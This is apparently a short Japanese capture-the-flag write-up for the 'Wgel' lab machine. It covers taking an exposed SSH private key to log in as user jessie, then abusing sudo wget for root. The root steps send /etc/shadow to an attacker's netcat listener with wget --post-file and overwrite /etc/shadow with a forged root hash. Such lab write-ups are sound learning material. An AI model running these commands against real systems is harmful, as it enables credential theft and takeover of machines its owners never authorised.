---
title: "Wgel"
date: 2024-03-16T11:43:01+09:00
draft: false
---

### user.txt

- unapp というアプリが使われている searchsploit は特になし
- /sitemap/.ssh
  - .ssh から id_rsa を持ってくる
  - ```ssh2john id_rsa > hash.txt```
  - ユーザ名はソースコードで jessie
- ```ssh -i id_rsa jessie@10.10.217.228```

### root.txt

- wget が sudo で使えるらしいが GTFObin ではうまくいかない
- wget privilege escalation でググる
  - ローカルで ```nc -lvnp 4444```
  - ターゲットで ```sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444```
  - /etc/shadow が見えるのでコピーする
  - ローカルで ./shadow.txt とかで保存
  - ローカルで新しいハッシュを作る
    - ```openssl passwd -6 -salt 'salt' 'password’```
    - これを shadow.txt に追記
    - ```root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::```
    - これを転送
  - ```sudo /usr/bin/wget http://<local-ip>:8000/shadow.txt -O /etc/shadow```
